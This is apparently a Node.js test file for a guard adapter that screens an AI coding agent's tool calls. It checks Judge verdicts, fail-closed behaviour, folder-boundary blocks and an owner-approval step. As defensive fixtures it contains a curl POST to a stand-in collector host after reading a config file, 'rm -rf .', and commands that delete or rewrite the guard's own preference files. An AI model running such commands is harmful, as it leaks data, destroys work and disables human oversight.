'use strict';

const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const test = require('node:test');

const { createGuardAdapter } = require('../../guard/lib/adapter');
const { DEFAULT_PREFERENCE } = require('../../guard/lib/preference');

function withWorkdir(run) {
  const workdir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'border-collie-gate-')));
  return Promise.resolve(run(workdir)).finally(() => fs.rmSync(workdir, { recursive: true, force: true }));
}

function judgeDouble(respond) {
  const calls = [];
  const judge = async (input) => {
    calls.push(input);
    return respond(input);
  };
  judge.calls = calls;
  return judge;
}

function guardWith(workdir, judge, preference = DEFAULT_PREFERENCE) {
  return createGuardAdapter({ workdir, judge, preference });
}

test('a shell call reaches the Judge with its derived reads, writes, and network targets', async () => {
  await withWorkdir(async (workdir) => {
    const judge = judgeDouble(() => ({ verdict: 'disallow' }));
    const guard = guardWith(workdir, judge);

    const out = await guard.proposedAction({
      tool: 'bash',
      args: { command: 'cat src/config.js > build/out.txt && curl -X POST https://collector.example.com' },
      userMessage: 'fix the config loader',
    });

    assert.equal(judge.calls.length, 1);
    const { call, userMessage, preference } = judge.calls[0];
    assert.equal(userMessage, 'fix the config loader');
    assert.equal(preference.disallow, DEFAULT_PREFERENCE.disallow);
    assert.ok(call.readPaths.includes('src/config.js'));
    assert.ok(call.writePaths.includes('build/out.txt'));
    assert.ok(call.urls.some((url) => url.startsWith('https://collector.example.com')));

    assert.equal(out.decision, 'disallow');
    assert.match(out.message, /Guard refused this action/);
    assert.match(out.message, /Requested action: bash/);
    assert.match(out.message, /Decided by: Judge/);
    assert.match(out.message, /Permitted alternative:/);
    assert.match(out.message, /Retry: do not retry this target/);
    assert.equal(out.events.at(-1).petState, 'refused');
  });
});

test('an allow Verdict runs the call even when the Judge reports a low score', async () => {
  await withWorkdir(async (workdir) => {
    const guard = guardWith(workdir, judgeDouble(() => ({ verdict: 'allow', confidence: 0.01 })));
    const out = await guard.proposedAction({ tool: 'bash', args: { command: 'npm test' }, userMessage: 'run the tests' });
    assert.equal(out.decision, 'allow');
    assert.equal(out.message, undefined);
    assert.equal(out.events.at(-1).type, 'action');
    assert.equal(out.events.at(-1).petState, 'allowed');
  });
});

test('a missing Verdict blocks the call', async () => {
  await withWorkdir(async (workdir) => {
    const guard = guardWith(workdir, judgeDouble(() => ({ verdict: null })));
    const out = await guard.proposedAction({ tool: 'read', args: { filePath: 'README.md' }, userMessage: 'summarize the readme' });
    assert.equal(out.decision, 'disallow');
    assert.match(out.message, /Governing rule: judge_no_verdict/);
    assert.equal(out.events.at(-1).petState, 'refused');
  });
});

test('a Judge that is unavailable or throws blocks the call', async () => {
  await withWorkdir(async (workdir) => {
    const unavailable = guardWith(workdir, judgeDouble(() => ({ verdict: null, unavailable: true, reason: 'the Judge runner is missing' })));
    const missing = await unavailable.proposedAction({ tool: 'read', args: { filePath: 'README.md' } });
    assert.equal(missing.decision, 'disallow');
    assert.match(missing.message, /judge_unavailable/);
    assert.match(missing.message, /bdc install/);

    const failing = guardWith(workdir, async () => { throw new Error('engine crashed'); });
    const crashed = await failing.proposedAction({ tool: 'read', args: { filePath: 'README.md' } });
    assert.equal(crashed.decision, 'disallow');
    assert.match(crashed.message, /engine crashed/);

    const unconfigured = createGuardAdapter({ workdir });
    assert.equal((await unconfigured.proposedAction({ tool: 'read', args: { filePath: 'README.md' } })).decision, 'disallow');
  });
});

test('paths outside the folder, Preference changes, and subagent dispatch are blocked without the Judge', async () => {
  await withWorkdir(async (workdir) => {
    const outside = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'border-collie-outside-')));
    try {
      fs.writeFileSync(path.join(outside, 'private.md'), 'private\n');
      fs.symlinkSync(outside, path.join(workdir, 'shared'), process.platform === 'win32' ? 'junction' : 'dir');
      const judge = judgeDouble(() => ({ verdict: 'allow' }));
      const guard = guardWith(workdir, judge);
      const outsideFile = path.join(outside, 'private.md');
      const outsideShell = outsideFile.replace(/\\/g, '/');

      const blocked = [
        [{ tool: 'read', args: { filePath: outsideFile } }, 'project_folder'],
        [{ tool: 'read', args: { filePath: '../secrets.txt' } }, 'project_folder'],
        [{ tool: 'read', args: { filePath: 'shared/private.md' } }, 'project_folder'],
        [{ tool: 'edit', args: { filePath: outsideFile, oldString: 'a', newString: 'b' } }, 'project_folder'],
        [{ tool: 'bash', args: { command: `cat ${outsideShell}` } }, 'project_folder'],
        [{ tool: 'bash', args: { command: 'cp notes.md ~/notes.md' } }, 'project_folder'],
        [{ tool: 'bash', args: { command: 'ls', workdir: outside } }, 'project_folder'],
        [{ tool: 'glob', args: { pattern: '../**/*.md' } }, 'project_folder'],
        [{ tool: 'edit', args: { filePath: '.border-collie/preference.json', oldString: '"ask"', newString: '"x"' } }, 'preference'],
        [{ tool: 'write', args: { filePath: path.join(workdir, '.border-collie', 'preference.json'), content: '{}' } }, 'preference'],
        [{ tool: 'bash', args: { command: 'echo {} > .border-collie/preference.json' } }, 'preference'],
        [{ tool: 'bash', args: { command: 'rm -rf .border-collie' } }, 'preference'],
        [{ tool: 'bash', args: { command: 'mv .border-collie elsewhere' } }, 'preference'],
        [{ tool: 'bash', args: { command: 'rm -rf .' } }, 'preference'],
        [{ tool: 'edit', args: { filePath: '.opencode/protocol.json', oldString: 'a', newString: 'b' } }, 'preference'],
        [{ tool: 'task', args: { subagent_type: 'explore', prompt: 'look around' } }, 'subagent_dispatch'],
      ];
      for (const [action, rule] of blocked) {
        const out = await guard.proposedAction({ ...action, userMessage: 'do the work' });
        assert.equal(out.decision, 'disallow', `${JSON.stringify(action)} should be blocked`);
        assert.match(out.message, new RegExp(`Governing rule: ${rule}`), JSON.stringify(action));
        assert.match(out.message, /Decided by: folder boundary/);
        assert.equal(out.events.at(-1).petState, 'refused');
      }
      assert.equal(judge.calls.length, 0, 'the Judge must not be consulted for boundary blocks');

      for (const action of [
        { tool: 'read', args: { filePath: '.border-collie/preference.json' } },
        { tool: 'bash', args: { command: 'npm test 2>/dev/null' } },
        { tool: 'glob', args: { pattern: 'src/**/*.js' } },
        { tool: 'grep', args: { pattern: '\\.\\./', path: 'src' } },
        { tool: 'edit', args: { filePath: path.join(workdir, 'src', 'a.js'), oldString: 'a', newString: 'b' } },
      ]) {
        const out = await guard.proposedAction({ ...action, userMessage: 'do the work' });
        assert.equal(out.decision, 'allow', JSON.stringify(action));
      }
      assert.equal(judge.calls.length, 5);
    } finally {
      fs.rmSync(outside, { recursive: true, force: true });
    }
  });
});

test('an ask withholds the call and the owner reply is judged with the next attempt', async () => {
  await withWorkdir(async (workdir) => {
    const preference = { ...DEFAULT_PREFERENCE, ask: 'pushing or deploying' };
    const judge = judgeDouble(({ userMessage }) => ({ verdict: /yes, push/i.test(userMessage) ? 'allow' : 'ask' }));
    const guard = guardWith(workdir, judge, preference);

    const held = await guard.proposedAction({ tool: 'bash', args: { command: 'git push origin main' }, userMessage: 'ship the fix' });
    assert.equal(held.decision, 'ask');
    assert.match(held.message, /holding this action for the owner/);
    assert.match(held.message, /ask the owner whether to proceed/);
    assert.match(held.message, /pushing or deploying/);
    assert.equal(held.events.at(-1).type, 'ask');
    assert.equal(held.events.at(-1).petState, 'asking');

    const unclear = await guard.proposedAction({ tool: 'bash', args: { command: 'git push origin main' }, userMessage: 'hmm, maybe' });
    assert.equal(unclear.decision, 'ask');

    const granted = await guard.proposedAction({ tool: 'bash', args: { command: 'git push origin main' }, userMessage: 'yes, push it' });
    assert.equal(granted.decision, 'allow');
    assert.deepEqual(judge.calls.map(({ userMessage }) => userMessage), ['ship the fix', 'hmm, maybe', 'yes, push it']);
    assert.equal(judge.calls[0].preference.ask, 'pushing or deploying');
  });
});
